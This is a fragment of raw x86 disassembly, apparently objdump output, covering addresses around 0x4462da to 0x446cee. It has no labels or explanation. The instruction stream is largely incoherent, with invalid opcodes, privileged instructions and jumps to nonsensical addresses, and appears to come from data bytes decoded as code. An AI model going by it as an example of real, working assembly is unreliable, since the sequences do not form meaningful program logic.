  4462da:	sahf   
  4462db:	xchg   edi,eax
  4462dc:	adc    ch,cl
  4462de:	push   cs
  4462df:	pop    es
  4462e0:	mov    dl,0x61
  4462e2:	mov    dh,0xed
  4462e4:	(bad)  
  4462e5:	call   0x61581351
  4462ea:	adc    cl,BYTE PTR [ecx]
  4462ec:	or     DWORD PTR [edi],esi
	...
  44630a:	add    BYTE PTR [eax],al
  44630c:	xchg   BYTE PTR [eax+0x570ee912],dl
  446312:	inc    eax
  446313:	cmc    
  446314:	inc    ebp
  446315:	enter  0x6213,0xe1
  446319:	add    BYTE PTR [eax-0x6f7ce013],cl
  44631f:	test   DWORD PTR [ebx],ebx
  446321:	add    BYTE PTR [eax],al
  446323:	mov    esi,0xd9aeecc9
  446328:	hlt    
  446329:	inc    ecx
  44632a:	bound  ebx,QWORD PTR [edx-0x6b47cc5]
  446330:	lea    ebx,[ecx-0x64668f13]
  446336:	adc    ch,cl
  446338:	push   cs
  446339:	adc    DWORD PTR [ebx-0x23],0x50
  44633d:	xor    DWORD PTR [eax+0x9cc00],0x63470200
  446347:	add    DWORD PTR [esi+eax*8+0x7ee3fff2],ecx
  44634e:	les    eax,FWORD PTR [ecx+edx*2]
  446351:	mov    edi,0x8798b5d
  446356:	pop    esi
  446357:	rol    esi,cl
  446359:	jle    0x446314
  44635b:	add    ebp,DWORD PTR [ebp+0x3416bbdb]
  446361:	cld    
  446362:	or     BYTE PTR [ebp+0x44],0x3a
  446366:	add    dl,BYTE PTR [eax+0x99c]
  44636c:	scas   eax,DWORD PTR es:[edi]
  44636d:	dec    eax
  44636e:	add    eax,0x6a
	...
  44638b:	add    BYTE PTR [eax],al
  44638d:	add    ch,dh
  44638f:	mov    ebx,0xdd23fba9
  446394:	jp     0x44635a
  446396:	call   0x11111fd9
  44639b:	sbb    ah,cl
  44639d:	int3   
  44639e:	and    BYTE PTR [eax],bl
  4463a0:	int3   
  4463a1:	int3   
  4463a2:	xor    BYTE PTR [eax],bl
  4463a4:	int3   
  4463a5:	int3   
  4463a6:	jns    0x446380
  4463a8:	jmp    0x446335
  4463aa:	test   eax,0xa8e9565b
  4463af:	jmp    0xfb563aa
  4463b4:	int3   
  4463b5:	int3   
  4463b6:	stc    
  4463b7:	fsubr  st,st(3)
  4463b9:	push   ecx
  4463ba:	neg    eax
  4463bc:	push   esp
  4463bd:	adc    BYTE PTR [edx],cl
  4463bf:	fldcw  WORD PTR [eax+ecx*1+0x37]
  4463c3:	popf   
  4463c4:	test   BYTE PTR [eax],al
  4463c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4463c7:	add    eax,DWORD PTR [eax]
  4463c9:	push   edi
  4463ca:	imul   edx,DWORD PTR [esi+0x37400f5],0x0
  4463d1:	jle    0x44641a
  4463d3:	fnstenv ds:0x17ee0d83
  4463d9:	(bad)  
  4463da:	stc    
  4463db:	pusha  
  4463dc:	push   ebp
  4463dd:	bnd fs jle 0x446445
  4463e1:	xchg   edx,ecx
  4463e3:	inc    esp
  4463e4:	jb     0x446368
  4463e6:	cmc    
  4463e7:	popa   
  4463e8:	std    
  4463e9:	(bad)  
  4463ea:	mov    ebp,0x4afc2c80
  4463ef:	fidiv  WORD PTR [ecx-0x76]
	...
  44640e:	add    BYTE PTR [eax],al
  446410:	jmp    0xdd446166
  446415:	rcl    BYTE PTR [edi],0xfc
  446418:	xor    al,dh
  44641a:	jg     0x4463e0
  44641c:	adc    eax,0xece83ad2
  446421:	push   ss
  446422:	fs stc 
  446424:	xchg   BYTE PTR [edi+0x690d1294],dh
  44642a:	js     0x4463b6
  44642c:	mov    ecx,0x8efffd56
  446431:	sub    dh,bh
  446433:	jl     0x446401
  446435:	bound  edi,QWORD PTR [esi]
  446437:	out    0xe,al
  446439:	sub    BYTE PTR [esi-0x3],dl
  44643c:	xchg   ebp,eax
  44643d:	mov    ds:0xcdd73561,eax
  446442:	sti    
  446443:	in     al,0xe
  446445:	fdiv   QWORD PTR [edi+0x71f78602]
  44644b:	cmp    eax,0x71422211
  446450:	es rol dh,cl
  446453:	or     edx,DWORD PTR [eax-0x79ec2758]
  446459:	ret    
  44645a:	not    DWORD PTR [eax+0x3e]
  44645d:	stc    
  44645e:	mov    ch,0xe7
  446460:	pop    esp
  446461:	xchg   esi,eax
  446462:	pop    ebp
  446463:	stc    
  446464:	mov    fs,WORD PTR [esp+esi*8-0x297be1a]
  44646b:	dec    DWORD PTR [esi+0xd8c60ff]
  446471:	add    bh,ah
  446473:	pop    es
	...
  446490:	add    BYTE PTR [eax],al
  446492:	add    al,0x7c
  446494:	pop    esp
  446495:	add    al,0xd
  446497:	add    dh,cl
  446499:	dec    ebp
  44649a:	adc    al,0x7c
  44649c:	push   esp
  44649d:	add    al,0xd
  44649f:	add    BYTE PTR [esi-0x6e],ch
  4464a2:	cdq    
  4464a3:	in     eax,dx
  4464a4:	out    0x3,al
  4464a6:	mov    ah,dl
  4464a8:	rcl    BYTE PTR [eax+0x5d65fbdc],cl
  4464ae:	push   ss
  4464af:	(bad)  
  4464b0:	mov    ah,0xe9
  4464b2:	xchg   ecx,eax
  4464b3:	inc    ecx
  4464b4:	leave  
  4464b5:	ss sub eax,0xacf7998a
  4464bb:	or     BYTE PTR [ecx-0x64],ch
  4464be:	(bad)  
  4464bf:	jmp    esi
  4464c1:	adc    bl,BYTE PTR [edi+0x75]
  4464c4:	outs   dx,DWORD PTR ds:[esi]
  4464c5:	cli    
  4464c6:	adc    dl,BYTE PTR [esi+0x5e]
  4464c9:	retf   0x8812
  4464cc:	add    eax,DWORD PTR ds:0x12f2bf04
  4464d2:	mov    edi,0xf2fa5076
  4464d7:	push   ebp
  4464d8:	pop    esi
  4464d9:	retf   0x88fe
  4464dc:	mov    cl,0xb
  4464de:	xchg   ebp,eax
  4464df:	hlt    
  4464e0:	out    dx,al
  4464e1:	mov    cs,WORD PTR [edi+0xd03d994]
  4464e7:	push   ebp
  4464e8:	mov    eax,ds:0xcf07bf7
  4464ed:	dec    esp
  4464ee:	das    
  4464ef:	xor    ebp,ecx
  4464f1:	xchg   ch,cl
  4464f3:	push   ecx
  4464f4:	pusha  
  4464f5:	mov    DWORD PTR [eax],eax
	...
  446513:	add    BYTE PTR [ecx-0x12],dh
  446516:	out    0x3,al
  446518:	das    
  446519:	xchg   DWORD PTR [ecx-0x65],ebx
  44651c:	(bad)  
  44651d:	jmp    esi
  44651f:	outs   dx,BYTE PTR ds:[esi]
  446520:	or     dh,bl
  446522:	call   FWORD PTR [ecx+0x5706e228]
  446528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446529:	repnz (bad) 
  44652b:	call   0x7041fabb
  446530:	pushf  
  446531:	xchg   esp,eax
  446532:	adc    ch,cl
  446534:	push   cs
  446535:	jnp    0x44657a
  446537:	lea    ebx,[ebx+0xef2288a]
  44653d:	add    BYTE PTR [ebp-0x3a5a9],al
  446543:	call   0x18832a96
  446548:	push   ebx
  446549:	ret    
  44654a:	out    0x9d,eax
  44654c:	fcom   DWORD PTR [esi-0x7]
  44654f:	ins    BYTE PTR es:[edi],dx
  446550:	test   BYTE PTR [eax-0x4ff116f9],cl
  446556:	mov    bl,BYTE PTR [edi-0x5e]
  446559:	(bad)  
  44655a:	(bad)  
  44655b:	call   0x5206e1b9
  446560:	lahf   
  446561:	dec    ebx
  446562:	stc    
  446563:	mov    edi,DWORD PTR ss:[esp+edx*1]
  446567:	inc    eax
  446568:	cwde   
  446569:	(bad)  
  44656a:	(bad)  
  44656b:	call   0xf800ef03
  446570:	push   cs
  446571:	add    BYTE PTR [ebp+0x4189fa94],al
  446577:	jmp    0x446579
	...
  446595:	add    BYTE PTR [ebx-0x6778f4b4],dl
  44659b:	fiadd  WORD PTR [ecx+ebx*1+0x62de43e4]
  4465a2:	mov    esp,0x44e061f0
  4465a7:	cwde   
  4465a8:	adc    ch,cl
  4465aa:	push   cs
  4465ab:	pop    es
  4465ac:	mov    dl,0x7f
  4465ae:	cdq    
  4465af:	icebp  
  4465b0:	(bad)  
  4465b1:	call   0x614c1737
  4465b6:	or     eax,0xf200f905
  4465bb:	push   edi
  4465bc:	or     BYTE PTR [esi+0xe793a],dh
  4465c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4465c3:	add    DWORD PTR [esi+0x14],0xffffffef
  4465c7:	cdq    
  4465c8:	add    DWORD PTR [eax-0x697baef8],ecx
  4465ce:	fcomp  DWORD PTR [ecx-0x7]
  4465d1:	call   FWORD PTR [ebx+0x64b10d49]
  4465d7:	and    al,dl
  4465d9:	xchg   bx,sp
  4465dc:	jp     0x4465a0
  4465de:	xlat   BYTE PTR ds:[ebx]
  4465df:	mov    BYTE PTR [esi+0x32bc],cl
  4465e5:	lods   ax,WORD PTR ds:[esi]
  4465e7:	mov    DWORD PTR [eax-0x1cffcbea],edi
  4465ed:	adc    edx,DWORD PTR [edx+0xb]
  4465f0:	loopne 0x446658
  4465f2:	sub    eax,0x3416b886
  4465f7:	add    BYTE PTR [ebx-0x3f],bh
	...
  446616:	add    BYTE PTR [eax],al
  446618:	aaa    
  446619:	mov    DWORD PTR [esi+0x42bc],eax
  44661f:	push   0x39485c
  446624:	int3   
  446625:	mov    bh,0x3a
  446627:	inc    eax
  446628:	hlt    
  446629:	test   BYTE PTR [esi-0x9547b18],bh
  44662f:	jmp    DWORD PTR [edi-0x38]
  446632:	pop    es
  446633:	mov    esp,DWORD PTR [edx]
  446635:	in     al,0x3d
  446637:	call   0xffc14747
  44663c:	pusha  
  44663d:	or     BYTE PTR [ebx-0xf0af33a],al
  446643:	(bad)  
  446644:	mov    ebx,0x3f5b5740
  446649:	ficom  DWORD PTR [ebx+eax*8+0x68]
  44664d:	ret    
  44664e:	retf   
  44664f:	int3   
  446650:	or     eax,0x96ec8b14
  446655:	hlt    
  446656:	or     ecx,DWORD PTR [ebp-0x6a]
  446659:	sbb    al,0xf4
  44665b:	push   eax
  44665c:	xchg   BYTE PTR [eax+0x3e],al
  44665f:	jmp    0xf9a24e61
  446664:	mov    ch,BYTE PTR [ecx-0x3]
  446667:	jl     0x4465ef
  446669:	push   0x1c862cd2
  44666e:	adc    BYTE PTR [ecx],cl
  446670:	mov    ebx,0x8cc60459
  446675:	jo     0x4466c5
  446677:	stc    
  446678:	or     eax,0x1d369
	...
  446699:	add    BYTE PTR [eax+esi*2+0x690df94e],cl
  4466a0:	add    al,0xf7
  4466a2:	mov    edx,fs
  4466a4:	dec    ebp
  4466a5:	stc    
  4466a6:	or     eax,0x8c01d369
  4466ab:	ret    0xf94d
  4466ae:	or     eax,0x4cc18c69
  4466b3:	leave  
  4466b4:	in     al,dx
  4466b5:	pop    eax
  4466b6:	push   ss
  4466b7:	sub    BYTE PTR [edx+ebx*2+0x51fd654f],bh
  4466be:	xchg   BYTE PTR [ecx+ecx*1+0xb8c0383],dl
  4466c5:	mov    ecx,DWORD PTR [ebx+0x68]
  4466c8:	mov    edi,0x43945658
  4466cd:	or     al,0xd
  4466cf:	out    0x5b,al
  4466d1:	adc    BYTE PTR [esi-0x5a],bl
  4466d4:	adc    ch,0x59
  4466d7:	aaa    
  4466d8:	mov    ah,BYTE PTR [ecx+esi*1+0xdfffd69]
  4466df:	pop    edx
  4466e0:	xchg   edi,eax
  4466e1:	add    cl,BYTE PTR [esi]
  4466e3:	and    edi,eax
  4466e5:	cld    
  4466e6:	vcvtsd2si ebx,xmm1
  4466ea:	mov    edi,0xb455e080
  4466ef:	jmp    esi
  4466f1:	ror    DWORD PTR [ecx+eax*4],1
  4466f4:	rcl    BYTE PTR [ebp-0x5c],0xff
  4466f8:	out    0x9b,al
  4466fa:	sub    al,BYTE PTR [eax+0x83e2]
	...
  44671c:	pushf  
  44671d:	pop    edx
  44671e:	test   al,0x6a
  446720:	adc    al,0x87
  446722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446723:	inc    ebp
  446724:	ins    DWORD PTR es:[edi],dx
  446725:	sti    
  446726:	int    0x41
  446728:	js     0x446763
  44672a:	cmp    DWORD PTR [ebp+0x6d],eax
  44672d:	out    dx,eax
  44672e:	xor    DWORD PTR [ebx],ecx
  446730:	stos   BYTE PTR es:[edi],al
  446731:	mov    dh,0x2b
  446733:	inc    edx
  446734:	adc    DWORD PTR [eax],eax
  446736:	push   0xe6ec9d5b
  44673b:	add    eax,DWORD PTR [esi+edi*2]
  44673e:	xchg   ebp,eax
  44673f:	add    al,0xd
  446741:	add    BYTE PTR [edi],ch
  446743:	scas   eax,DWORD PTR es:[edi]
  446744:	push   0xffffffe1
  446746:	rcl    BYTE PTR [esi+0x58],0x40
  44674a:	dec    ebp
  44674b:	or     ecx,DWORD PTR [edx+0x3084e2ac]
  446751:	(bad)  
  446752:	hlt    
  446753:	add    ecx,DWORD PTR ds:0xd049e98
  446759:	add    BYTE PTR [eax+ebp*8-0x12],ch
  44675d:	jmp    ecx
  44675f:	xchg   ebp,eax
  446760:	pop    ds
  446761:	std    
  446762:	sbb    al,0xf
  446764:	mov    edi,0x202e7aa
  446769:	(bad)  
  44676a:	sub    al,0xf
  44676c:	mov    edi,0xe202e4aa
  446771:	std    
  446772:	sbb    al,0xf
  446774:	lahf   
  446775:	stos   BYTE PTR es:[edi],al
  446776:	in     eax,0x2
  446778:	loop   0x446777
  44677a:	sub    al,0xf
  44677c:	lahf   
  44677d:	stos   BYTE PTR es:[edi],al
  44677e:	(bad)  
  44677f:	in     al,dx
	...
  44679c:	add    BYTE PTR [eax],al
  44679e:	cmovns edi,ebp
  4467a1:	and    dl,BYTE PTR [edx]
  4467a3:	mov    ss,WORD PTR [edx-0x14]
  4467a6:	cmovns edi,ebp
  4467a9:	mov    dl,0x3
  4467ab:	mov    ss,WORD PTR [edx-0x11]
  4467ae:	cmovns edi,ebp
  4467b1:	mov    ds:0xee528e13,al
  4467b6:	cmovns edi,ebp
  4467b9:	mov    dl,0x3
  4467bb:	mov    ss,WORD PTR [edx-0x1f]
  4467be:	cmovns edi,ebp
  4467c1:	mov    ds:0xf0528e13,al
  4467c6:	cmovns edi,ebp
  4467c9:	mov    dl,0x3
  4467cb:	mov    ss,WORD PTR [edx-0x1d]
  4467ce:	cmovns edi,ebp
  4467d1:	mov    ds:0xf2528e13,al
  4467d6:	cmovns edi,ebp
  4467d9:	mov    dl,0x3
  4467db:	mov    ss,WORD PTR [edx-0x1b]
  4467de:	cmovns edi,ebp
  4467e1:	mov    ds:0xf4528e13,al
  4467e6:	cmovns edi,ebp
  4467e9:	xor    al,BYTE PTR [ebx]
  4467eb:	mov    ss,WORD PTR [edx-0x19]
  4467ee:	cmovns edi,ebp
  4467f1:	and    dl,BYTE PTR [ebx]
  4467f3:	mov    ss,WORD PTR [edx-0xa]
  4467f6:	cmovns edi,ebp
  4467f9:	xor    cl,BYTE PTR [edi]
  4467fb:	dec    ecx
  4467fc:	jge    0x44682d
  4467fe:	(bad)  
  4467ff:	mov    eax,0x6408
	...
  446820:	fist   DWORD PTR [edi-0x7]
  446823:	es xchg esi,eax
  446825:	loopne 0x4468a6
  446827:	out    0x8e,al
  446829:	dec    esi
  44682a:	fild   QWORD PTR [eax]
  44682c:	je     0x446835
  44682e:	cmp    edx,DWORD PTR [bp+di]
  446831:	add    cl,bh
  446833:	add    BYTE PTR [ebx],dl
  446835:	inc    cl
  446837:	mov    eax,0x7fff7d55
  44683c:	retf   
  44683d:	fidivr DWORD PTR [eax-0x349c1c16]
  446843:	shld   DWORD PTR [ebx-0x4d51fc0a],esi,0x44
  44684b:	or     al,0xb3
  44684d:	jns    0x446882
  44684f:	call   ebx
  446851:	mov    dl,0x7c
  446853:	(bad)  [ebx-0x5bff3688]
  446859:	cld    
  44685a:	jp     0x446857
  44685c:	add    edi,DWORD PTR fs:[edx-0x6b]
  446860:	je     0x44685e
  446862:	dec    DWORD PTR [edx+0x4e7bca7]
  446868:	loope  0x4468d1
  44686a:	sbb    eax,0xe6a7300
  44686f:	add    ebp,DWORD PTR [esi+0x6556ae02]
  446875:	push   eax
  446877:	add    ebx,DWORD PTR [esi+0x3656ae02]
  44687d:	push   eax
  44687f:	add    ebp,DWORD PTR [esi+0x2]
  446882:	scas   al,BYTE PTR es:[edi]
  446883:	push   esi
	...
  4468a0:	add    BYTE PTR [eax],al
  4468a2:	daa    
  4468a3:	push   eax
  4468a5:	add    edi,esi
  4468a7:	add    ch,BYTE PTR [esi-0xf00c7aa]
  4468ad:	add    ebp,esi
  4468af:	add    ch,BYTE PTR [esi-0xf00d6aa]
  4468b5:	add    ebx,esi
  4468b7:	add    ch,BYTE PTR [esi-0xeff05aa]
  4468bd:	add    ebp,DWORD PTR [esi]
  4468bf:	std    
  4468c0:	lods   eax,DWORD PTR ds:[esi]
  4468c1:	push   esi
  4468c2:	jmp    0x4468c4
  4468c4:	icebp  
  4468c5:	add    edi,DWORD PTR [esi]
  4468c7:	std    
  4468c8:	lods   eax,DWORD PTR ds:[esi]
  4468c9:	push   esi
  4468ca:	or     eax,0xef70061
  4468cf:	and    ecx,DWORD PTR [ebx]
  4468d1:	mov    dl,0x43
  4468d3:	push   eax
  4468d4:	add    bh,dh
  4468d6:	push   cs
  4468d7:	adc    ecx,DWORD PTR [ebx]
  4468d9:	mov    dl,0x63
  4468db:	arpl   WORD PTR [eax],ax
  4468dd:	test   DWORD PTR [esi],0x63b20b23
  4468e3:	push   edx
  4468e4:	add    bh,dh
  4468e6:	push   cs
  4468e7:	xchg   ebx,eax
  4468e8:	or     al,0xb2
  4468ea:	inc    ebx
  4468eb:	gs add bh,dh
  4468ee:	push   cs
  4468ef:	mov    ds:0x5443b20c,eax
  4468f4:	add    bh,dh
  4468f6:	push   cs
  4468f7:	xchg   ebx,eax
  4468f8:	or     al,0xb2
  4468fa:	jecxz  0x446962
  4468fc:	add    bh,dh
  4468fe:	push   cs
  4468ff:	mov    ds:0x55e3b20c,eax
  446904:	add    bh,dh
	...
  446922:	add    BYTE PTR [eax],al
  446924:	push   cs
  446925:	xchg   ebx,eax
  446926:	and    ch,0xfd
  446929:	pop    ecx
  44692a:	push   esi
  44692b:	jge    0x446978
  44692d:	dec    ecx
  44692e:	lds    ecx,FWORD PTR [eax]
  446930:	nop
  446931:	dec    ebp
  446932:	pop    esp
  446933:	stc    
  446934:	push   edx
  446935:	in     al,0x37
  446937:	je     0x44694f
  446939:	xchg   bx,ax
  44693b:	add    cl,BYTE PTR [esi]
  44693d:	mov    eax,ds:0x9235fcc3
  446942:	shl    dl,cl
  446944:	jne    0x44696e
  446946:	jge    0x446949
  446948:	lea    ebp,[esi+0x2e37bf5d]
  44694e:	out    0xcd,al
  446950:	or     bl,BYTE PTR [ecx+0x5c]
  446953:	stc    
  446954:	push   cs
  446955:	adc    edx,DWORD PTR [ebp+0x7d5d8d6f]
  44695b:	icebp  
  44695c:	jmp    0x3500:0x64096717
  446963:	or     al,0xd
  446965:	dec    edi
  446966:	sbb    al,BYTE PTR [eax]
  446968:	jecxz  0x4469e4
  44696a:	sub    bh,BYTE PTR [ebp-0x4308a05d]
  446970:	adc    DWORD PTR [ecx-0x62],eax
  446973:	mov    esi,0x4fe6fb90
  446978:	fnstcw WORD PTR [ebx]
  44697a:	pushf  
  44697b:	mov    BYTE PTR [ecx+0xad65db5],dh
  446981:	test   ecx,ebx
  446983:	rol    BYTE PTR [ebx],1
  446985:	jnp    0x4469b3
  446987:	or     al,0x0
	...
  4469a5:	add    BYTE PTR [eax-0x2ad11d3c],dl
  4469ab:	jns    0x4469a4
  4469ad:	mov    eax,DWORD PTR [ecx]
  4469af:	add    DWORD PTR [edi],esp
  4469b1:	retf   0x571f
  4469b4:	sbb    DWORD PTR [ecx-0x70e3c437],edi
  4469ba:	jno    0x446a36
  4469bc:	sbb    al,0x8
  4469be:	mov    ?,WORD PTR [eax]
  4469c0:	sbb    ecx,DWORD PTR [ecx]
  4469c2:	mov    ah,al
  4469c4:	out    dx,al
  4469c5:	mov    dl,dl
  4469c7:	jmp    FWORD PTR [eax+0x1fc00d04]
  4469cd:	shl    DWORD PTR [ebx-0x54],1
  4469d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4469d1:	dec    eax
  4469d2:	inc    ecx
  4469d3:	cmp    ebp,DWORD PTR [ebx+0x1c3b5948]
  4469d9:	mov    bl,0xdc
  4469db:	mov    dl,0x65
  4469dd:	push   0x1fbb7af1
  4469e2:	cmc    
  4469e3:	jp     0x446990
  4469e5:	pop    ds
  4469e6:	jmp    0x8a200f65
  4469eb:	imul   ebx,DWORD PTR [ebx+0x4],0x46fe000d
  4469f2:	mov    cl,al
  4469f4:	repnz mov fs,WORD PTR [ebx-0x34]
  4469f8:	push   DWORD PTR [ebx+ecx*1-0x34141a73]
  4469ff:	mov    ds,ebp
  446a01:	stc    
  446a02:	add    ebp,DWORD PTR [eax]
  446a04:	xchg   ebp,edi
  446a06:	or     al,BYTE PTR [ebx+0x797e]
	...
  446a28:	or     DWORD PTR [eax],eax
  446a2a:	add    BYTE PTR [edx-0x65],ah
  446a2d:	shl    DWORD PTR [ecx+eiz*1],1
  446a30:	mov    ch,0x4b
  446a32:	xchg   BYTE PTR [ecx],ah
  446a34:	cwde   
  446a35:	lods   al,BYTE PTR ds:[esi]
  446a36:	and    edx,ecx
  446a38:	xchg   ebx,eax
  446a39:	fidiv  WORD PTR [edi]
  446a3b:	pusha  
  446a3c:	frstor [ecx]
  446a3e:	add    al,0x72
  446a40:	mov    al,ds:0xfc5d8ad9
  446a45:	inc    DWORD PTR [esi-0x7ae012ab]
  446a4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446a4c:	aas    
  446a4d:	sub    BYTE PTR [ebp-0x37],bh
  446a50:	or     eax,DWORD PTR [ebp-0x7b82fabc]
  446a56:	ds add eax,0xe8ff0234
  446a5c:	push   cs
  446a5d:	and    ebp,eax
  446a5f:	or     ebx,DWORD PTR es:[ebx]
  446a62:	jmp    0x446ad6
  446a64:	push   eax
  446a65:	aad    0x86
  446a67:	sub    eax,0x98fcec2d
  446a6c:	mov    esp,edx
  446a6e:	and    esi,ecx
  446a70:	pop    es
  446a71:	(bad)  
  446a72:	sbb    DWORD PTR [eax-0x7e],esi
  446a75:	and    DWORD PTR [eax],edx
  446a77:	out    0x9f,al
  446a79:	lods   al,BYTE PTR ds:[esi]
  446a7a:	aaa    
  446a7b:	outs   dx,BYTE PTR ds:[esi]
  446a7c:	mov    DWORD PTR [ebx+eiz*1+0x3fd683f5],ebp
  446a83:	jb     0x446abf
  446a85:	and    ebp,esp
  446a87:	hlt    
  446a88:	xchg   ebp,eax
  446a89:	(bad)  
	...
  446aa8:	add    BYTE PTR [eax],al
  446aaa:	retf   
  446aab:	div    BYTE PTR [eax+0x343a1800]
  446ab1:	int    0xfb
  446ab3:	jle    0x446a95
  446ab5:	add    ah,dh
  446ab7:	add    BYTE PTR [ecx-0x16],bh
  446aba:	in     al,0x0
  446abc:	stc    
  446abd:	(bad)  
  446abe:	sti    
  446abf:	js     0x446a95
  446ac1:	add    ah,dh
  446ac3:	add    BYTE PTR [edi],al
  446ac5:	mov    bh,0xb0
  446ac7:	repz idiv BYTE PTR [ebx]
  446aca:	daa    
  446acb:	xor    dh,dl
  446acd:	mov    esp,DWORD PTR [eax+0x30f03ec]
  446ad3:	dec    ebp
  446ad4:	cli    
  446ad5:	cmp    dh,BYTE PTR [eax-0x14]
  446ad8:	pcmpeqw mm3,QWORD PTR [ebx]
  446adb:	jl     0x446af1
  446add:	and    al,0x3f
  446adf:	xor    BYTE PTR ds:0x1d281f04,bl
  446ae5:	and    BYTE PTR [edi+0x104482b1],dh
  446aeb:	push   eax
  446aec:	mov    bl,0xf8
  446aee:	retf   0xf6a6
  446af1:	lea    ecx,[eax]
  446af3:	in     al,dx
  446af4:	pop    es
  446af5:	add    DWORD PTR [eax+eax*1-0x7b],esi
  446af9:	mov    ah,0x74
  446afb:	clc    
  446afc:	clc    
  446afd:	jmp    DWORD PTR [ebx+edi*2+0x4]
  446b01:	xor    al,BYTE PTR [edi+0x4c]
  446b04:	xor    esi,DWORD PTR [ebp+0x60]
  446b07:	jnp    0x446b4d
  446b09:	xor    dh,BYTE PTR [eax-0xd]
  446b0c:	inc    ebx
  446b0d:	cmp    al,BYTE PTR [eax]
	...
  446b2b:	add    BYTE PTR [eax+0x3d],ah
  446b2e:	add    BYTE PTR [ebx-0x1693048a],al
  446b34:	(bad)  
  446b35:	xor    BYTE PTR [edx+eax*8+0x30],bh
  446b39:	cdq    
  446b3a:	idiv   edi
  446b3c:	and    al,0x0
  446b3e:	ins    DWORD PTR es:[edi],dx
  446b3f:	push   es
  446b40:	mov    bh,0xc5
  446b42:	stc    
  446b43:	ror    BYTE PTR ds:0xc2bf3bf,0xda
  446b4a:	xor    DWORD PTR [eax],eax
  446b4c:	sbb    BYTE PTR [edx+0x1b],0x85
  446b50:	mov    DWORD PTR ds:0x54ca2524,eax
  446b56:	add    edi,edi
  446b58:	cli    
  446b59:	pop    ecx
  446b5a:	ror    BYTE PTR [ebx-0x7a],cl
  446b5d:	lea    ebx,[ecx]
  446b5f:	cmp    BYTE PTR [esi+0x261c198d],dl
  446b65:	push   ss
  446b66:	xlat   BYTE PTR ds:[ebx]
  446b67:	or     al,0x86
  446b69:	jne    0x446b84
  446b6b:	or     BYTE PTR [esi+0x6984bd7f],al
  446b71:	inc    ebp
  446b72:	add    DWORD PTR [ebp+0x4a663d19],eax
  446b78:	mov    edx,0x5185585a
  446b7d:	std    
  446b7e:	sti    
  446b7f:	xchg   BYTE PTR [ecx+0x5],dl
  446b82:	clc    
  446b83:	xchg   BYTE PTR [edi-0x57],dl
  446b86:	sbb    bh,BYTE PTR [ebp+0x748c4c18]
  446b8c:	jmp    0x1346fed
	...
  446bad:	add    BYTE PTR [ebp+edx*1-0x35edf7e0],dl
  446bb4:	mov    al,0x37
  446bb6:	jp     0x446b96
  446bb8:	fidivr DWORD PTR [edi]
  446bba:	test   ch,al
  446bbc:	pop    ds
  446bbd:	or     al,0x96
  446bbf:	push   ebp
  446bc0:	sbb    edi,esp
  446bc2:	sub    al,0x72
  446bc4:	pop    eax
  446bc5:	stc    
  446bc6:	xchg   BYTE PTR ds:0x1d4a3820,dl
  446bcc:	and    BYTE PTR [edi+ecx*1],bl
  446bcf:	pop    eax
  446bd0:	std    
  446bd1:	call   DWORD PTR [edi+ebx*1+0x44e184d4]
  446bd8:	adc    eax,0xaffd185
  446bdd:	clc    
  446bde:	xchg   ecx,eax
  446bdf:	mov    esi,0xcb451cd2
  446be4:	in     al,0x8c
  446be6:	pop    eax
  446be7:	jg     0x446c0c
  446be9:	pop    ds
  446bea:	mov    eax,0xc9b6a1a9
  446bef:	sub    eax,DWORD PTR ds:[edi-0x2f]
  446bf3:	cmp    esp,edi
  446bf5:	xchg   BYTE PTR [edx+0x0],dl
  446bf8:	out    0x86,eax
  446bfa:	dec    edx
  446bfb:	add    bh,ah
  446bfd:	xchg   BYTE PTR [edx+0x0],dl
  446c00:	out    0x86,eax
  446c02:	dec    edx
  446c03:	add    bh,ah
  446c05:	add    ecx,DWORD PTR ds:0xd03e800
  446c0b:	add    dh,ah
  446c0d:	add    ecx,DWORD PTR ds:0x3e200
	...
  446c2f:	add    BYTE PTR ds:0xd03e200,cl
  446c35:	add    dl,cl
  446c37:	add    ecx,DWORD PTR ds:0xd042200
  446c3d:	add    BYTE PTR [edx+0x4],bl
  446c40:	or     eax,0xd04d200
  446c45:	add    dl,cl
  446c47:	add    eax,0x3c2000d
  446c4c:	or     eax,0x82ffba00
  446c51:	dec    edx
  446c52:	mov    dl,0x7
  446c54:	or     eax,0x72f7aa00
  446c59:	dec    edx
  446c5a:	mov    ds:0x9a000d17,al
  446c5f:	xlat   BYTE PTR ds:[ebx]
  446c60:	bound  ecx,QWORD PTR [edx-0x6e]
  446c63:	push   edi
  446c64:	or     eax,0x52578a00
  446c69:	dec    edx
  446c6a:	adc    BYTE PTR [edi+0x48],0x4a
  446c6e:	jp     0x446cc7
  446c70:	or     al,0x0
  446c72:	add    BYTE PTR [esi-0x1e],dh
  446c75:	clc    
  446c76:	jmp    FWORD PTR [ebp-0x26]
  446c79:	call   0x906d27d
  446c7e:	add    BYTE PTR [esi-0x46],bl
  446c81:	enter  0x55ff,0xc2
  446c85:	dec    eax
  446c86:	add    BYTE PTR [esi-0x46],cl
  446c89:	dec    eax
  446c8a:	inc    DWORD PTR [ebp+0x62]
  446c8d:	inc    edi
  446c8e:	std    
  446c8f:	cmp    eax,0x3601475a
	...
  446cb0:	add    BYTE PTR [eax],al
  446cb2:	bound  eax,QWORD PTR [edi+0x9]
  446cb5:	cs pop edx
  446cb7:	inc    edi
  446cb8:	sbb    DWORD PTR [esi],esp
  446cba:	inc    edx
  446cbb:	inc    edi
  446cbc:	cmp    DWORD PTR [esi],ebx
  446cbe:	cmp    al,BYTE PTR [edi+0x79]
  446cc1:	push   ss
  446cc2:	inc    edx
  446cc3:	inc    edi
  446cc4:	stc    
  446cc5:	mov    dh,0xa0
  446cc7:	scas   al,BYTE PTR es:[edi]
  446cc8:	dec    esp
  446cc9:	mov    ds,WORD PTR gs:[eax+eax*2-0x3]
  446cce:	xchg   edi,eax
  446ccf:	aam    0x23
  446cd1:	xchg   ecx,eax
  446cd2:	xchg   esi,eax
  446cd4:	sbb    esp,DWORD PTR [edx+0x63]
  446cd7:	std    
  446cd8:	test   bh,ch
  446cda:	wrmsr  
  446cdc:	jge    0x446cb1
  446cde:	pop    ss
  446cdf:	add    DWORD PTR [ebp+ecx*1-0x1b],0x9d055480
  446ce7:	test   BYTE PTR [ebp+ecx*1-0x3b],ch
  446ceb:	test   BYTE PTR [edx-0x27],cl
  446cee:	xchg   edi,eax
